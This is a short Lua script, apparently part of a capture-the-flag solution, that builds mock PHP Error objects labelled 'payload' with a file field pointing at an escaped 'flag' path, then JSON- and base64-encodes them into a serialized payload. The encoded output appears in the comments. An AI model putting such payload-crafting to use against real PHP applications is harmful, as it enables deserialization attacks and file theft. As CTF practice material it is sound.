json = require "json"
local base64 = require'base64'
local date = {
    a = {},
    b = {},
    file = "\\f\\l\\a\\g"
 }
 
 -- 创建一个函数来模拟PHP中的Error类
local function Error(message, code)
     return {
         message = message,
         code = code
     }
end
 
 date.a = Error("payload", 1)
 date.b = Error("payload", 2)
 -- 序列化date对象为字符串
local serialized_str = json.encode(date)
local encoded = base64.encode( serialized_str )

 -- 输出序列化和编码后的字符串
print(encoded)
--eyJhIjp7Im1lc3NhZ2UiOiJwYXlsb2FkIiwiY29kZSI6MX0sImZpbGUiOiJcXGZcXGxcXGFcXGciLCJiIjp7Im1lc3NhZ2UiOiJwYXlsb2FkIiwiY29kZSI6Mn19
--eyJhIjp7Im1lc3NhZ2UiOiJwYXlsb2FkIiwiY29kZSI6MX0sImZpbGUiOiJcXGZcXGxcXGFcXGciLCJiIjp7Im1lc3NhZ2UiOiJwYXlsb2FkIiwiY29kZSI6Mn19